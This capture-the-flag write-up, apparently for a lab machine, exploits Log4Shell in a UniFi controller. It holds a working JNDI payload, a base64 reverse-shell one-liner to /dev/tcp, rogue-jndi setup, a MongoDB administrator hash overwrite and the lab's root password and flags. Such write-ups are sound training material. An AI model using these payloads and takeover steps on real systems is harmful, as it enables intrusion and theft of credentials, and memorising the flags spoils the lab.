# Unified Write-up

#Vulnerability Assessment
#Databases
#Custom Applications
#MongoDB
#Java
#Reconnaissance
#Clear Text Credentials
#Default Credentials
#Code Injection

## Introduction

This writeup explores the effects of exploiting Log4J in a very well known network appliance monitoring
system called "UniFi". This box will show you how to set up and install the necessary packages and tools to
exploit UniFi by abusing the Log4J vulnerability and manipulate a POST header called remember , giving you
a reverse shell on the machine. You'll also change the administrator's password by altering the hash saved
in the MongoDB instance that is running on the system, which will allow access to the administration panel
and leads to the disclosure of the administrator's SSH password.

## Enumeration

1. **Scan with Nmap**:
    - `nmap -sV -sC {TARGET_IP}`
    - **Port 22/tcp**: OpenSSH 8.2p1 (Ubuntu 4ubuntu0.3) This port is used for secure shell (SSH) access, providing encrypted communication and remote login capabilities. The scan also reveals the SSH host keys (RSA, ECDSA, ED25519).

    - **Port 6789/tcp**: IBM DB2 Administration Service (?) - This port appears to be related to IBM DB2 database administration, though the specific service version could not be determined.

    - **Port 8080/tcp**: HTTP Proxy - This port is open and running an HTTP proxy service. The service might be redirecting requests, as indicated by the HTTP responses (302 redirects and 404 not found). The title suggests it redirects to https://10.129.83.18:8443/manage.

    - **Port 8443/tcp**: SSL/Nagios NSCA - This port is running a Nagios NSCA service over SSL, which is commonly used for monitoring and alerting. The SSL certificate details indicate it is for a UniFi network management interface, with a certificate valid from December 30, 2021, to April 3, 2024.

2. **CVE-2021-44228**

CVE-2021-44228, also known as "Log4Shell," is a critical security vulnerability in the Apache Log4j 2 library, a widely used Java-based logging utility. This vulnerability has been highly publicized due to its severity and the widespread use of Log4j in various software applications and services

**JNDI** is the acronym for the Java Naming and Directory Interface API . By making calls to this API,
applications locate resources and other program objects. A resource is a program object that provides
connections to systems, such as database servers and messaging systems.

**LDAP** is the acronym for Lightweight Directory Access Protocol , which is an open, vendor-neutral,
industry standard application protocol for accessing and maintaining distributed directory information
services over the Internet or a Network. The default port that LDAP runs on is port 389 .

- Test vulnerability
```
curl -i -s -k -X POST -H $'Host: 10.129.83.18:8443' -H $'Content-Length: 104' --data-binary $'{\"username\":\"a\",\"password\":\"a\",\"remember\":\"${jndi:ldap://eb0uvi.dnslog.cn:1389/o=tomcat}\",\"strict\":true}' $'https://10.129.83.18:8443/manage/account/login'

HTTP/1.1 200 
X-Frame-Options: SAMEORIGIN
vary: accept-encoding
Accept-Ranges: bytes
Last-Modified: Tue, 14 Sep 2021 12:14:41 GMT
Cache-Control: max-age=0
Expires: Thu, 27 Jun 2024 11:21:02 GMT
Content-Type: text/html
Content-Length: 1325
Date: Thu, 27 Jun 2024 11:21:02 GMT
```

## Atack target 
Now that you know the target is vulnerable, we are going to try and get a reverse shell so we can interact with the underlying Linux operating system. First, you need to clone and build the tool, rogue-jndi from the GitHub repository linked below:

- `git clone https://github.com/veracode-research/rogue-jndi && cd rogue-jndi && mvn package`

Once the Jar is compiled, you’ll have to craft a command to deliver the reverse shell. Unlike vCenter, we don’t have nc out of the box. Let’s craft our reverse shell and Base64 encode it using the one-liner below. Modify the command to fit your needs, replacing the IP address and port.

- `echo 'bash -c bash -i >&/dev/tcp/{tun0}/4444 0>&1' | base64`

With that Base64 output, build your command in rogue-jndi:

- `java -jar rogue-jndi/target/RogueJndi-1.1.jar --command "bash -c {echo,{BASE64 STRING}}|{base64,-d}|{bash,-i}" --hostname "{tun0}"`

Now that the server is listening locally on port 389 , let's open another terminal and start a Netcat listener to
capture the reverse shell.

- `nc -lvp 4444`

Open Burpsuite and intercept request when i try to login. Add this payload in remember:
- `${jndi:ldap://{Your Tun0 IP}:1389/o=tomcat}` then `forward`

- having a good shell `/bin/bash -i`

```
unifi@unified:/usr/lib/unifi$ whoami
whoami
unifi
```

## Escalade Privilege

display information about active processes
a: Shows processes for all users.
u: Displays the user/owner of the processes.
x: Shows processes without a controlling terminal.

- `ps aux`

```
 ps aux
ps aux
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
unifi          1  0.0  0.0   1080     4 ?        Ss   13:00   0:00 /sbin/docker-init -- /usr/local/bin/docker-entrypoint.sh unifi
unifi          7  0.0  0.1  18512  3180 ?        S    13:00   0:00 bash /usr/local/bin/docker-entrypoint.sh unifi
unifi         17  0.9 25.0 3671844 509008 ?      Sl   13:00   0:28 java -Dunifi.datadir=/unifi/data -Dunifi.logdir=/unifi/log -Dunifi.rundir=/var/run/unifi -Xmx1024M -Djava.awt.headless=true -Dfile.encoding=UTF-8 -jar /usr/lib/unifi/lib/ace.jar start
unifi         67  0.1  4.1 1101700 84888 ?       Sl   13:00   0:05 bin/mongod --dbpath /usr/lib/unifi/data/db --port 27117 --unixSocketPrefix /usr/lib/unifi/run --logRotate reopen --logappend --logpath /usr/lib/unifi/logs/mongod.log --pidfilepath /usr/lib/unifi/run/mongod.pid --bind_ip 127.0.0.1
unifi        886  0.0  0.1  18380  3172 ?        S    13:28   0:00 bash -c {echo,YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTUuMTYzLzQ0NDQgMD4mMQo=}|{base64,-d}|{bash,-i}
unifi        890  0.0  0.1  18512  3396 ?        S    13:28   0:00 bash -i
unifi        893  0.0  0.1  18380  3192 ?        S    13:28   0:00 bash
unifi       1113  0.0  0.1  18512  3496 ?        S    13:37   0:00 /bin/bash -i
unifi       1504  0.0  0.1  34408  2948 ?        R    13:51   0:00 ps aux
```

- `mongo --port 27117 ace --eval "db.admin.find().forEach(printjson);"`

```
MongoDB shell version v3.6.3
connecting to: mongodb://127.0.0.1:27117/ace
MongoDB server version: 3.6.3
{
        "_id" : ObjectId("61ce278f46e0fb0012d47ee4"),
        "name" : "administrator",
        "email" : "administrator@unified.htb",
        "x_shadow" : "$6$Ry6Vdbse$8enMR5Znxoo.WfCMd/Xk65GwuQEPx1M.QP8/qHiQV0PvUc3uHuonK4WcTQFN1CRk3GwQaquyVwCVq8iQgPTt4.",
        "time_created" : NumberLong(1640900495),
        "last_site_name" : "default",
<SNIP>
```

## Modify password 

1. **Generate password with mdpasswd**:

    The output reveals a user called Administrator. Their password hash is located in the x_shadow variable but
    in this instance it cannot be cracked with any password cracking utilities. Instead we can change the
    x_shadow password hash with our very own created hash in order to replace the administrators password
    and authenticate to the administrative panel. To do this we can use the mkpasswd command line utility.

    - `mkpasswd -m sha-512 Password1234`
    - result : `$6$oQn89ZI6UCtL2kTx$rFRyJkyEy2Zq2Sf/uBjnA.89sQ.A45TaT1nQbCBvzUoMbvCBK2sTplJF4Z3sPedskjPdywhLBvv7KEQOXnNq71`

2. **Replace password**:

    - `mongo --port 27117 ace --eval 'db.admin.update({"_id":ObjectId("{ObjectIdAdministrateur}")},{$set:{"x_shadow":"SHA_512 Hash Generated"}})'`

    - mongo --port 27117 ace --eval 'db.admin.update({"_id":
ObjectId("61ce278f46e0fb0012d47ee4")},{$set:{"x_shadow":"$6$oQn89ZI6UCtL2kTx$rFRyJkyEy2Zq2Sf/uBjnA.89sQ.A45TaT1nQbCBvzUoMbvCBK2sTplJF4Z3sPedskjPdywhLBvv7KEQOXnNq71"}})'

3. **Connect over Administrator**

    - In website over administrator, we can the password of root that is `NotACrackablePassword4U2022`

    - `ssh root@{TARGET_IP}`
    ```
    root@unified:~# whoami
    root
    ```

## Flag

user : `6ced1a6a89e666c0620cdb10262ba127`

root : `e50bc93c75b634e4b272d2f771c33681`